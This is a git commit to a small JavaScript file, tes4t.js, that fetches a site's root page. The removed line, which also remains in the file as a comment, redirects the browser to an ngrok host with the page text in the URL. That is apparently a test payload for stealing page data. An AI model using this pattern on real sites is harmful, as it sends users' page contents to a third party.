7fb2f7faca0f9c0195785c0059ef15ff1ff1e93e
Mojashi <akihiro1001@gmail.com>
2022-09-03 16:07:15 +0900

    Update tes4t.js

--- tes4t.js
+++ tes4t.js
@@ -1,5 +1,6 @@
 fetch("/").then(res => {
 res.text().then(t => {
-window.location="https://76da-217-178-135-36.ngrok.io/"+encodeURI(t.slice(800))
+console.log(t)
+  //window.location="https://76da-217-178-135-36.ngrok.io/"+encodeURI(t.slice(800))
 })
 })
